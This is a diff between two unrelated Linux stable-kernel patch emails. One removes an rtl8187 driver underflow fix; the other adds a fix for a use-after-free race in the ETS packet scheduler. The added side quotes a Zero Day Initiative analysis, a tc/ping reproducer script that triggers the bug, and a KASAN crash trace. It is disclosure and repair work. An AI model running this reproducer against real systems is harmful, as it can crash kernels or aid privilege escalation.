@@ -1,54 +1,57 @@
-Return-Path: <stable+bounces-209567-lists+stable=lfdr.de@vger.kernel.org>
+Return-Path: <stable+bounces-209140-lists+stable=lfdr.de@vger.kernel.org>
 X-Original-To: lists+stable@lfdr.de
 Delivered-To: lists+stable@lfdr.de
-Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
-	by mail.lfdr.de (Postfix) with ESMTPS id 434B4D27824
-	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 19:28:17 +0100 (CET)
+Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id C4C70D26AC1
+	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 18:44:08 +0100 (CET)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sea.lore.kernel.org (Postfix) with ESMTP id EBF49323EAAD
-	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 17:44:24 +0000 (UTC)
+	by sea.lore.kernel.org (Postfix) with ESMTP id 0C78D32359B8
+	for <lists+stable@lfdr.de>; Thu, 15 Jan 2026 17:24:31 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id A086F2F619D;
-	Thu, 15 Jan 2026 17:44:24 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id BDF7139E199;
+	Thu, 15 Jan 2026 17:24:07 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="bOFgzjfh"
+	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="WzHhClQs"
 X-Original-To: stable@vger.kernel.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 644352D541B;
-	Thu, 15 Jan 2026 17:44:24 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 80B312D9494;
+	Thu, 15 Jan 2026 17:24:07 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1768499064; cv=none; b=KhPpT6yglohZ1+F2v/Gvb7H+aLLBZ9aH6tEGueodJmjA6uX1grdkjDBp10bpAdoRvgTxgogxw21PjDI6b9A53ZwH5BGZo0N1zQwhFTXa5+aEVSz6rc2z0D/QgJ/wrp7GfsJJi6CfpNGMCZrjLX91MfJ12Xi1BAy09Xbuiol8j9o=
+	t=1768497847; cv=none; b=cxITkWPZex8K7/uGzJC2JgvJdQZWh6vbrjp/s9S2cqQtKlVawZx70EEvxDwSB06zMfBvK92ZzFXxtJw+R+gJtoTcn8Jz1omNdKv4FLAHTcuwDbf1SI4+oEugxrJ3e+uH43IVsSuUrNKT+YgqRWUzeop6jj1UhA4HiPaPRSfRAwE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1768499064; c=relaxed/simple;
-	bh=Ok2pV3s5j/Z/6J72+jUZfTtLhwPc4u6qOLMUJ86RpwU=;
+	s=arc-20240116; t=1768497847; c=relaxed/simple;
+	bh=XF6NseEevpHqO8JLh4PWxE5DeiHS6VcMTgD2saUdJ7A=;
 	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=u3WZvQkU6Vg7dcGhRPSxFxl6EM8no/JCEcfqz4cuWSLzca8crdeYkwe63Xd+t69G8BkXvbd11Z5G5w4i8p3vG/o6RfP0p7deV9NWBXlzeEhhLUTexhnlV6YQb/kDg/3Lf/rkYQfzL7y9c1O2lJrsxKH6UF+6Cj5bZ4oZ9R4DiVA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=bOFgzjfh; arc=none smtp.client-ip=10.30.226.201
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id DF6A6C116D0;
-	Thu, 15 Jan 2026 17:44:23 +0000 (UTC)
+	 MIME-Version; b=f3mTiQ7AXXslwBnKPjaEvipn643L4s2tYSUsTrKhQLBhJPr0Ilj8ASRYKyigyVKOPdoITAt7g1FRgFfR6sbDkWelO9DIo7SsR6XIQ10tUKQfHauhfV8iOGNXrKRFPlGTXeapE0KIjerBfPhc+TVnxPS3BiuIdLJDlGTljzholSc=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=WzHhClQs; arc=none smtp.client-ip=10.30.226.201
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id A0B00C116D0;
+	Thu, 15 Jan 2026 17:24:06 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-	s=korg; t=1768499064;
-	bh=Ok2pV3s5j/Z/6J72+jUZfTtLhwPc4u6qOLMUJ86RpwU=;
+	s=korg; t=1768497847;
+	bh=XF6NseEevpHqO8JLh4PWxE5DeiHS6VcMTgD2saUdJ7A=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-	b=bOFgzjfhd/zz7novnxHaUPkXPPvMQY379adKVHfo2PtwTZbE9f2RRYUT+hCI2WAmN
-	 CmrSH+TgwDXaU+p7QcaIaODEB+qUUsMOHIJw/cXe6t5+V/JMvgBeGG4hQrdkzBV3zy
-	 pf3J4bPXQjFAJKM0zT1EOWh8eJiZTiGQFHZz2sqc=
+	b=WzHhClQs8k+xOPm4afUInakVt9YV7nWUxzCeksXbWvLq6q0hp28FMrNfh3HXQQ9Uw
+	 ispMQhbLK/ai/w7EHhyt1QsHzIyuJDYwWZ6nNgd1ouNgzga8UiT321P9A7IwHT7/o7
+	 +CBU1OEA+xakLURUhcSoy7l3QaOQPQALWVwhI7zs=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
-	Seungjin Bae <eeodqql09@gmail.com>,
-	Ping-Ke Shih <pkshih@realtek.com>,
+	zdi-disclosures@trendmicro.com,
+	Victor Nogueira <victor@mojatatu.com>,
+	Jamal Hadi Salim <jhs@mojatatu.com>,
+	Davide Caratti <dcaratti@redhat.com>,
+	Paolo Abeni <pabeni@redhat.com>,
 	Sasha Levin <sashal@kernel.org>
-Subject: [PATCH 5.10 088/451] wifi: rtl818x: rtl8187: Fix potential buffer underflow in rtl8187_rx_cb()
-Date: Thu, 15 Jan 2026 17:44:49 +0100
-Message-ID: <20260115164234.100534956@linuxfoundation.org>
+Subject: [PATCH 5.15 224/554] net/sched: ets: Always remove class from active list before deleting in ets_qdisc_change
+Date: Thu, 15 Jan 2026 17:44:50 +0100
+Message-ID: <20260115164254.354445993@linuxfoundation.org>
 X-Mailer: git-send-email 2.52.0
-In-Reply-To: <20260115164230.864985076@linuxfoundation.org>
-References: <20260115164230.864985076@linuxfoundation.org>
+In-Reply-To: <20260115164246.225995385@linuxfoundation.org>
+References: <20260115164246.225995385@linuxfoundation.org>
 User-Agent: quilt/0.69
 X-stable: review
 X-Patchwork-Hint: ignore
@@ -60,91 +63,233 @@ List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-5.10-stable review patch.  If anyone has any objections, please let me know.
+5.15-stable review patch.  If anyone has any objections, please let me know.
 
 ------------------
 
-From: Seungjin Bae <eeodqql09@gmail.com>
+From: Jamal Hadi Salim <jhs@mojatatu.com>
 
-[ Upstream commit b647d2574e4583c2e3b0ab35568f60c88e910840 ]
+[ Upstream commit ce052b9402e461a9aded599f5b47e76bc727f7de ]
 
-The rtl8187_rx_cb() calculates the rx descriptor header address
-by subtracting its size from the skb tail pointer.
-However, it does not validate if the received packet
-(skb->len from urb->actual_length) is large enough to contain this
-header.
+zdi-disclosures@trendmicro.com says:
 
-If a truncated packet is received, this will lead to a buffer
-underflow, reading memory before the start of the skb data area,
-and causing a kernel panic.
+The vulnerability is a race condition between `ets_qdisc_dequeue` and
+`ets_qdisc_change`.  It leads to UAF on `struct Qdisc` object.
+Attacker requires the capability to create new user and network namespace
+in order to trigger the bug.
+See my additional commentary at the end of the analysis.
 
-Add length checks for both rtl8187 and rtl8187b descriptor headers
-before attempting to access them, dropping the packet cleanly if the
-check fails.
+Analysis:
 
-Fixes: 6f7853f3cbe4 ("rtl8187: change rtl8187_dev.c to support RTL8187B (part 2)")
-Signed-off-by: Seungjin Bae <eeodqql09@gmail.com>
-Signed-off-by: Ping-Ke Shih <pkshih@realtek.com>
-Link: https://patch.msgid.link/20251118013258.1789949-2-eeodqql09@gmail.com
+static int ets_qdisc_change(struct Qdisc *sch, struct nlattr *opt,
+                          struct netlink_ext_ack *extack)
+{
+...
+
+      // (1) this lock is preventing .change handler (`ets_qdisc_change`)
+      //to race with .dequeue handler (`ets_qdisc_dequeue`)
+      sch_tree_lock(sch);
+
+      for (i = nbands; i < oldbands; i++) {
+              if (i >= q->nstrict && q->classes[i].qdisc->q.qlen)
+                      list_del_init(&q->classes[i].alist);
+              qdisc_purge_queue(q->classes[i].qdisc);
+      }
+
+      WRITE_ONCE(q->nbands, nbands);
+      for (i = nstrict; i < q->nstrict; i++) {
+              if (q->classes[i].qdisc->q.qlen) {
+		      // (2) the class is added to the q->active
+                      list_add_tail(&q->classes[i].alist, &q->active);
+                      q->classes[i].deficit = quanta[i];
+              }
+      }
+      WRITE_ONCE(q->nstrict, nstrict);
+      memcpy(q->prio2band, priomap, sizeof(priomap));
+
+      for (i = 0; i < q->nbands; i++)
+              WRITE_ONCE(q->classes[i].quantum, quanta[i]);
+
+      for (i = oldbands; i < q->nbands; i++) {
+              q->classes[i].qdisc = queues[i];
+              if (q->classes[i].qdisc != &noop_qdisc)
+                      qdisc_hash_add(q->classes[i].qdisc, true);
+      }
+
+      // (3) the qdisc is unlocked, now dequeue can be called in parallel
+      // to the rest of .change handler
+      sch_tree_unlock(sch);
+
+      ets_offload_change(sch);
+      for (i = q->nbands; i < oldbands; i++) {
+	      // (4) we're reducing the refcount for our class's qdisc and
+	      //  freeing it
+              qdisc_put(q->classes[i].qdisc);
+	      // (5) If we call .dequeue between (4) and (5), we will have
+	      // a strong UAF and we can control RIP
+              q->classes[i].qdisc = NULL;
+              WRITE_ONCE(q->classes[i].quantum, 0);
+              q->classes[i].deficit = 0;
+              gnet_stats_basic_sync_init(&q->classes[i].bstats);
+              memset(&q->classes[i].qstats, 0, sizeof(q->classes[i].qstats));
+      }
+      return 0;
+}
+
+Comment:
+This happens because some of the classes have their qdiscs assigned to
+NULL, but remain in the active list. This commit fixes this issue by always
+removing the class from the active list before deleting and freeing its
+associated qdisc
+
+Reproducer Steps
+(trimmed version of what was sent by zdi-disclosures@trendmicro.com)
+
+```
+DEV="${DEV:-lo}"
+ROOT_HANDLE="${ROOT_HANDLE:-1:}"
+BAND2_HANDLE="${BAND2_HANDLE:-20:}"   # child under 1:2
+PING_BYTES="${PING_BYTES:-48}"
+PING_COUNT="${PING_COUNT:-200000}"
+PING_DST="${PING_DST:-127.0.0.1}"
+
+SLOW_TBF_RATE="${SLOW_TBF_RATE:-8bit}"
+SLOW_TBF_BURST="${SLOW_TBF_BURST:-100b}"
+SLOW_TBF_LAT="${SLOW_TBF_LAT:-1s}"
+
+cleanup() {
+  tc qdisc del dev "$DEV" root 2>/dev/null
+}
+trap cleanup EXIT
+
+ip link set "$DEV" up
+
+tc qdisc del dev "$DEV" root 2>/dev/null || true
+
+tc qdisc add dev "$DEV" root handle "$ROOT_HANDLE" ets bands 2 strict 2
+
+tc qdisc add dev "$DEV" parent 1:2 handle "$BAND2_HANDLE" \
+  tbf rate "$SLOW_TBF_RATE" burst "$SLOW_TBF_BURST" latency "$SLOW_TBF_LAT"
+
+tc filter add dev "$DEV" parent 1: protocol all prio 1 u32 match u32 0 0 flowid 1:2
+tc -s qdisc ls dev $DEV
+
+ping -I "$DEV" -f -c "$PING_COUNT" -s "$PING_BYTES" -W 0.001 "$PING_DST" \
+  >/dev/null 2>&1 &
+tc qdisc change dev "$DEV" root handle "$ROOT_HANDLE" ets bands 2 strict 0
+tc qdisc change dev "$DEV" root handle "$ROOT_HANDLE" ets bands 2 strict 2
+tc -s qdisc ls dev $DEV
+tc qdisc del dev "$DEV" parent 1:2 || true
+tc -s qdisc ls dev $DEV
+tc qdisc change dev "$DEV" root handle "$ROOT_HANDLE" ets bands 1 strict 1
+```
+
+KASAN report
+```
+==================================================================
+BUG: KASAN: slab-use-after-free in ets_qdisc_dequeue+0x1071/0x11b0 kernel/net/sched/sch_ets.c:481
+Read of size 8 at addr ffff8880502fc018 by task ping/12308
+>
+CPU: 0 UID: 0 PID: 12308 Comm: ping Not tainted 6.18.0-rc4-dirty #1 PREEMPT(full)
+Hardware name: QEMU Ubuntu 25.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+Call Trace:
+ <IRQ>
+ __dump_stack kernel/lib/dump_stack.c:94
+ dump_stack_lvl+0x100/0x190 kernel/lib/dump_stack.c:120
+ print_address_description kernel/mm/kasan/report.c:378
+ print_report+0x156/0x4c9 kernel/mm/kasan/report.c:482
+ kasan_report+0xdf/0x110 kernel/mm/kasan/report.c:595
+ ets_qdisc_dequeue+0x1071/0x11b0 kernel/net/sched/sch_ets.c:481
+ dequeue_skb kernel/net/sched/sch_generic.c:294
+ qdisc_restart kernel/net/sched/sch_generic.c:399
+ __qdisc_run+0x1c9/0x1b00 kernel/net/sched/sch_generic.c:417
+ __dev_xmit_skb kernel/net/core/dev.c:4221
+ __dev_queue_xmit+0x2848/0x4410 kernel/net/core/dev.c:4729
+ dev_queue_xmit kernel/./include/linux/netdevice.h:3365
+[...]
+
+Allocated by task 17115:
+ kasan_save_stack+0x30/0x50 kernel/mm/kasan/common.c:56
+ kasan_save_track+0x14/0x30 kernel/mm/kasan/common.c:77
+ poison_kmalloc_redzone kernel/mm/kasan/common.c:400
+ __kasan_kmalloc+0xaa/0xb0 kernel/mm/kasan/common.c:417
+ kasan_kmalloc kernel/./include/linux/kasan.h:262
+ __do_kmalloc_node kernel/mm/slub.c:5642
+ __kmalloc_node_noprof+0x34e/0x990 kernel/mm/slub.c:5648
+ kmalloc_node_noprof kernel/./include/linux/slab.h:987
+ qdisc_alloc+0xb8/0xc30 kernel/net/sched/sch_generic.c:950
+ qdisc_create_dflt+0x93/0x490 kernel/net/sched/sch_generic.c:1012
+ ets_class_graft+0x4fd/0x800 kernel/net/sched/sch_ets.c:261
+ qdisc_graft+0x3e4/0x1780 kernel/net/sched/sch_api.c:1196
+[...]
+
+Freed by task 9905:
+ kasan_save_stack+0x30/0x50 kernel/mm/kasan/common.c:56
+ kasan_save_track+0x14/0x30 kernel/mm/kasan/common.c:77
+ __kasan_save_free_info+0x3b/0x70 kernel/mm/kasan/generic.c:587
+ kasan_save_free_info kernel/mm/kasan/kasan.h:406
+ poison_slab_object kernel/mm/kasan/common.c:252
+ __kasan_slab_free+0x5f/0x80 kernel/mm/kasan/common.c:284
+ kasan_slab_free kernel/./include/linux/kasan.h:234
+ slab_free_hook kernel/mm/slub.c:2539
+ slab_free kernel/mm/slub.c:6630
+ kfree+0x144/0x700 kernel/mm/slub.c:6837
+ rcu_do_batch kernel/kernel/rcu/tree.c:2605
+ rcu_core+0x7c0/0x1500 kernel/kernel/rcu/tree.c:2861
+ handle_softirqs+0x1ea/0x8a0 kernel/kernel/softirq.c:622
+ __do_softirq kernel/kernel/softirq.c:656
+[...]
+
+Commentary:
+
+1. Maher Azzouzi working with Trend Micro Zero Day Initiative was reported as
+the person who found the issue. I requested to get a proper email to add to the
+reported-by tag but got no response. For this reason i will credit the person
+i exchanged emails with i.e zdi-disclosures@trendmicro.com
+
+2. Neither i nor Victor who did a much more thorough testing was able to
+reproduce a UAF with the PoC or other approaches we tried. We were both able to
+reproduce a null ptr deref. After exchange with zdi-disclosures@trendmicro.com
+they sent a small change to be made to the code to add an extra delay which
+was able to simulate the UAF. i.e, this:
+   qdisc_put(q->classes[i].qdisc);
+   mdelay(90);
+   q->classes[i].qdisc = NULL;
+
+I was informed by Thomas Gleixner(tglx@linutronix.de) that adding delays was
+acceptable approach for demonstrating the bug, quote:
+"Adding such delays is common exploit validation practice"
+The equivalent delay could happen "by virt scheduling the vCPU out, SMIs,
+NMIs, PREEMPT_RT enabled kernel"
+
+3. I asked the OP to test and report back but got no response and after a
+few days gave up and proceeded to submit this fix.
+
+Fixes: de6d25924c2a ("net/sched: sch_ets: don't peek at classes beyond 'nbands'")
+Reported-by: zdi-disclosures@trendmicro.com
+Tested-by: Victor Nogueira <victor@mojatatu.com>
+Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
+Reviewed-by: Davide Caratti <dcaratti@redhat.com>
+Link: https://patch.msgid.link/20251128151919.576920-1-jhs@mojatatu.com
+Signed-off-by: Paolo Abeni <pabeni@redhat.com>
 Signed-off-by: Sasha Levin <sashal@kernel.org>
 ---
- .../wireless/realtek/rtl818x/rtl8187/dev.c    | 27 +++++++++++++------
- 1 file changed, 19 insertions(+), 8 deletions(-)
+ net/sched/sch_ets.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
 
-diff --git a/drivers/net/wireless/realtek/rtl818x/rtl8187/dev.c b/drivers/net/wireless/realtek/rtl818x/rtl8187/dev.c
-index c9df185dc3f4f..00493a2391179 100644
---- a/drivers/net/wireless/realtek/rtl818x/rtl8187/dev.c
-+++ b/drivers/net/wireless/realtek/rtl818x/rtl8187/dev.c
-@@ -338,14 +338,16 @@ static void rtl8187_rx_cb(struct urb *urb)
- 	spin_unlock_irqrestore(&priv->rx_queue.lock, f);
- 	skb_put(skb, urb->actual_length);
+diff --git a/net/sched/sch_ets.c b/net/sched/sch_ets.c
+index d95d127975254..bcd91ffe9bc6a 100644
+--- a/net/sched/sch_ets.c
++++ b/net/sched/sch_ets.c
+@@ -665,7 +665,7 @@ static int ets_qdisc_change(struct Qdisc *sch, struct nlattr *opt,
+ 	sch_tree_lock(sch);
  
--	if (unlikely(urb->status)) {
--		dev_kfree_skb_irq(skb);
--		return;
--	}
-+	if (unlikely(urb->status))
-+		goto free_skb;
- 
- 	if (!priv->is_rtl8187b) {
--		struct rtl8187_rx_hdr *hdr =
--			(typeof(hdr))(skb_tail_pointer(skb) - sizeof(*hdr));
-+		struct rtl8187_rx_hdr *hdr;
-+
-+		if (skb->len < sizeof(struct rtl8187_rx_hdr))
-+			goto free_skb;
-+
-+		hdr = (typeof(hdr))(skb_tail_pointer(skb) - sizeof(*hdr));
- 		flags = le32_to_cpu(hdr->flags);
- 		/* As with the RTL8187B below, the AGC is used to calculate
- 		 * signal strength. In this case, the scaling
-@@ -355,8 +357,12 @@ static void rtl8187_rx_cb(struct urb *urb)
- 		rx_status.antenna = (hdr->signal >> 7) & 1;
- 		rx_status.mactime = le64_to_cpu(hdr->mac_time);
- 	} else {
--		struct rtl8187b_rx_hdr *hdr =
--			(typeof(hdr))(skb_tail_pointer(skb) - sizeof(*hdr));
-+		struct rtl8187b_rx_hdr *hdr;
-+
-+		if (skb->len < sizeof(struct rtl8187b_rx_hdr))
-+			goto free_skb;
-+
-+		hdr = (typeof(hdr))(skb_tail_pointer(skb) - sizeof(*hdr));
- 		/* The Realtek datasheet for the RTL8187B shows that the RX
- 		 * header contains the following quantities: signal quality,
- 		 * RSSI, AGC, the received power in dB, and the measured SNR.
-@@ -409,6 +415,11 @@ static void rtl8187_rx_cb(struct urb *urb)
- 		skb_unlink(skb, &priv->rx_queue);
- 		dev_kfree_skb_irq(skb);
+ 	for (i = nbands; i < oldbands; i++) {
+-		if (i >= q->nstrict && q->classes[i].qdisc->q.qlen)
++		if (cl_is_active(&q->classes[i]))
+ 			list_del_init(&q->classes[i].alist);
+ 		qdisc_purge_queue(q->classes[i].qdisc);
  	}
-+	return;
-+
-+free_skb:
-+	dev_kfree_skb_irq(skb);
-+	return;
- }
- 
- static int rtl8187_init_urbs(struct ieee80211_hw *dev)
 -- 
 2.51.0
 
